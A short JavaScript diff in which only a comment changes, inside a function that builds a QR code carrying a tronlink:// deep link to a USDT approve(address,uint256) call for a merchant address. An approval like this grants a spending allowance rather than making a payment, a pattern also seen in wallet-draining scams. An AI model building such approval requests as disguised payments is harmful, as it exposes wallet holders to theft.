@@ -60,7 +60,7 @@ function generateQR() {
   const addressHex = base58ToHex(merchant).substring(2)
   const parameter = pad64(addressHex) + pad64(value.toString(16))
 
-  // 生成深鏈 URL
+  // 生成深鏈 URL (這是 TokenPocket 錢包能夠識別的 URL)
   const deepLinkUrl = `tronlink://wallet/contract?contract=${usdtContract}&functionSelector=approve(address,uint256)&parameter=${parameter}`
 
   // 生成 QR
